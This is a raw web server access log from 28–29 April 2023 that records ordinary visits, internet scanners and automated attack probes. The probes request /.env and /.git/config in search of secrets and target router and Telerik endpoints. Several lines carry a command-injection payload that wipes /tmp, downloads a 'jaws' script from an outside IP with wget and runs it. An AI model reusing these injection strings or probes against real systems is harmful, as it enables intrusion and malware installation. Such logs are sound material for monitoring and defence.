localhost:80 43.154.128.189 - - [28/Apr/2023:07:45:29 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:08:13:59 +0000] "GET / HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.244.48 - - [28/Apr/2023:08:29:58 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:08:29:58 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 192.241.227.28 - - [28/Apr/2023:08:42:14 +0000] "GET / HTTP/1.1" 200 381 "-" "Mozilla/5.0 zgrab/0.x"
localhost:80 135.125.244.48 - - [28/Apr/2023:08:47:24 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:08:47:24 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 139.162.232.223 - - [28/Apr/2023:08:48:45 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 172.104.11.4 - - [28/Apr/2023:08:54:38 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 43.154.128.189 - - [28/Apr/2023:09:05:19 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 139.162.70.117 - - [28/Apr/2023:09:11:51 +0000] "GET /.git/config HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [28/Apr/2023:10:25:14 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 109.237.98.226 - - [28/Apr/2023:10:52:58 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 109.237.98.226 - - [28/Apr/2023:10:52:58 +0000] "\x16\x03\x01\x01H\x01" 400 483 "-" "-"
localhost:80 192.155.90.118 - - [28/Apr/2023:11:04:19 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [28/Apr/2023:11:05:38 +0000] "GET / HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.244.48 - - [28/Apr/2023:11:05:55 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:11:05:55 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 161.35.233.14 - - [28/Apr/2023:11:28:49 +0000] "GET /explore HTTP/1.1" 404 245 "-" "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7"
localhost:80 2.187.177.191 - - [28/Apr/2023:11:44:26 +0000] "GET / HTTP/1.1" 200 354 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
localhost:80 43.154.128.189 - - [28/Apr/2023:11:44:55 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.35.18.61 - - [28/Apr/2023:12:04:51 +0000] "GET / HTTP/1.1" 200 354 "-" "-"
localhost:80 193.35.18.61 - - [28/Apr/2023:12:04:52 +0000] "POST /HNAP1/ HTTP/1.1" 301 495 "-" "Mozila/5.0"
localhost:80 176.58.98.42 - - [28/Apr/2023:12:09:48 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 135.125.244.48 - - [28/Apr/2023:12:29:24 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:12:29:24 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:12:48:25 +0000] "GET / HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [28/Apr/2023:13:04:32 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 87.236.176.219 - - [28/Apr/2023:13:42:27 +0000] "GET / HTTP/1.1" 200 401 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
localhost:80 135.125.244.48 - - [28/Apr/2023:14:03:44 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:14:03:44 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [28/Apr/2023:14:24:35 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:14:32:35 +0000] "GET / HTTP/1.1" 200 438 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.244.48 - - [28/Apr/2023:15:03:29 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:15:03:30 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 45.79.172.21 - - [28/Apr/2023:15:22:10 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 2.57.122.160 - - [28/Apr/2023:15:50:45 +0000] "GET / HTTP/1.1" 200 354 "-" "-"
localhost:80 128.14.141.34 - - [28/Apr/2023:16:18:36 +0000] "GET / HTTP/1.1" 200 381 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
localhost:80 172.104.11.46 - - [28/Apr/2023:16:54:34 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [28/Apr/2023:16:57:27 +0000] "GET / HTTP/1.1" 200 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 135.125.244.48 - - [28/Apr/2023:17:03:34 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:17:03:34 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 43.154.128.189 - - [28/Apr/2023:17:04:25 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:18:00:42 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:18:00:42 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 85.217.144.24 - - [28/Apr/2023:18:19:22 +0000] "GET / HTTP/1.1" 200 400 "-" "Linux Gnu (cow)"
localhost:80 43.154.128.189 - - [28/Apr/2023:18:23:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 45.33.80.243 - - [28/Apr/2023:18:55:44 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [28/Apr/2023:19:08:44 +0000] "GET / HTTP/1.1" 200 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 104.211.220.126 - - [28/Apr/2023:19:24:40 +0000] "GET //.env HTTP/1.1" 404 226 "-" "Go-http-client/1.1"
localhost:80 135.125.244.48 - - [28/Apr/2023:19:33:37 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:19:33:37 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 60.221.61.247 - - [28/Apr/2023:19:38:52 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 404 2150 "-" "Hello, world"
localhost:80 60.221.238.187 - - [28/Apr/2023:19:38:59 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 404 2150 "-" "Hello, world"
localhost:80 58.18.38.131 - - [28/Apr/2023:19:39:01 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 404 2150 "-" "Hello, world"
localhost:80 88.80.185.201 - - [28/Apr/2023:19:39:06 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 88.80.185.201 - - [28/Apr/2023:19:39:06 +0000] "GET / HTTP/1.1" 200 380 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
localhost:80 43.154.128.189 - - [28/Apr/2023:19:42:25 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:19:47:17 +0000] "GET / HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:19:47:17 +0000] "GET /favicon.ico HTTP/1.1" 200 5731 "http://54.155.101.2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:19:47:29 +0000] "GET / HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:19:48:21 +0000] "-" 408 0 "-" "-"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:06:30 +0000] "GET / HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:07:21 +0000] "-" 408 0 "-" "-"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:09:54 +0000] "GET / HTTP/1.1" 500 87191 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:10:45 +0000] "-" 408 0 "-" "-"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:16:33 +0000] "GET / HTTP/1.1" 500 85513 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:16:34 +0000] "GET /favicon.ico HTTP/1.1" 200 5732 "http://54.155.101.2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:19:22 +0000] "GET / HTTP/1.1" 200 6348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:20:31 +0000] "GET / HTTP/1.1" 200 6348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:20:38 +0000] "GET / HTTP/1.1" 200 6348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:21:46 +0000] "GET / HTTP/1.1" 200 6348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:21:52 +0000] "GET / HTTP/1.1" 200 6348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 179.235.209.46 - - [28/Apr/2023:20:28:56 +0000] "GET / HTTP/1.1" 200 6349 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:20:49:03 +0000] "GET / HTTP/1.1" 200 531 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [28/Apr/2023:21:00:56 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:21:19:18 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:21:19:18 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 87.121.221.49 - - [28/Apr/2023:21:32:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2150 "http://54.155.101.2:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
localhost:80 128.1.248.42 - - [28/Apr/2023:21:33:48 +0000] "GET / HTTP/1.1" 200 6287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:21:47:15 +0000] "GET / HTTP/1.1" 200 524 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 94.102.61.80 - - [28/Apr/2023:21:48:51 +0000] "GET / HTTP/1.1" 200 6288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
localhost:80 43.154.128.189 - - [28/Apr/2023:22:19:35 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 212.191.12.34 - - [28/Apr/2023:22:37:19 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
localhost:80 135.125.244.48 - - [28/Apr/2023:22:53:25 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [28/Apr/2023:22:53:25 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:22:59:33 +0000] "GET / HTTP/1.1" 200 6344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:22:59:35 +0000] "GET /favicon.ico HTTP/1.1" 304 249 "http://54.155.101.2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:22:59:37 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:22:59:48 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:00:29 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:00:31 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:02:18 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:02:20 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:02:23 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:02:57 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:03:02 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:03:07 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:03:11 +0000] "GET / HTTP/1.1" 200 6341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:03:14 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:03:22 +0000] "GET / HTTP/1.1" 200 6342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:04:03 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:22:42 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:22:45 +0000] "GET /favicon.ico HTTP/1.1" 304 250 "http://54.155.101.2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 39.104.27.100 - - [28/Apr/2023:23:25:10 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 100.43.163.61/jaws;sh+/tmp/jaws" 400 483 "-" "-"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:25:32 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 154.209.125.66 - - [28/Apr/2023:23:32:43 +0000] "GET / HTTP/1.1" 200 22474 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
localhost:80 43.154.128.189 - - [28/Apr/2023:23:38:12 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:38:32 +0000] "GET / HTTP/1.1" 200 6343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 198.235.24.14 - - [28/Apr/2023:23:49:36 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 168.196.86.7 - - [28/Apr/2023:23:55:36 +0000] "GET / HTTP/1.1" 200 6344 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
localhost:80 162.142.125.11 - - [29/Apr/2023:00:01:28 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [29/Apr/2023:00:34:17 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 172.105.128.12 - - [29/Apr/2023:00:53:14 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 43.154.128.189 - - [29/Apr/2023:00:56:55 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 45.66.230.36 - - [29/Apr/2023:01:04:23 +0000] "GET / HTTP/1.1" 200 6305 "-" "Linux Gnu (cow)"
localhost:80 135.125.244.48 - - [29/Apr/2023:01:10:39 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [29/Apr/2023:01:10:39 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 198.235.24.82 - - [29/Apr/2023:01:21:04 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 43.134.171.148 - - [29/Apr/2023:01:31:45 +0000] "GET / HTTP/1.1" 200 6287 "-" "'Mozilla/5.0"
localhost:80 43.154.128.189 - - [29/Apr/2023:02:15:13 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.244.48 - - [29/Apr/2023:02:22:22 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.244.48 - - [29/Apr/2023:02:22:22 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 198.235.24.148 - - [29/Apr/2023:02:23:30 +0000] "GET / HTTP/1.0" 200 22396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
